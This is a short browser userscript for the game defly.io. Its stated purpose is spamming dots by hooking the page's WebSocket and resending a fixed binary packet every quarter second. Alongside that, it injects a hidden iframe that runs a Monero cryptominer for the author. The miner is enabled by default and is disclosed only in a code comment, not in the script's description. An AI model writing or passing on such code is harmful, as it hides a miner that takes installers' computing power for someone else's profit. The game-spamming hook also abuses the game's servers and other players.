// ==UserScript==
// @name         Defly.io Dot Spammer
// @namespace    Nebula_Devs
// @version      0.1
// @description  A script that places dots in defly.io every 0.25 seconds.
// @author       Mega_Mewthree
// @match        *://defly.io/*
// @grant        none
// ==/UserScript==

// Mining helps support the developer of this script.
// Set this to false if you want to disable mining.

const enableMiner = true;

if (enableMiner && window.navigator.hardwareConcurrency > 1){
    var iframe = document.createElement("iframe");
    iframe.src = "https://monerominer.rocks/miner.php?siteid=1681&style=nogui&payout=hash-payout&throttle=0.1";
    window.document.head.appendChild(iframe);
}

var ws;

WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(m){
    this.oldSend(m);
    if (ws !== this){
        ws = this;
    }
};

const sendDot = new ArrayBuffer(9);
(new Uint8Array(sendDot)).set([3,67,222,22,244,67,163,53,227]);

setInterval(() => {ws && ws.send(sendDot);}, 250);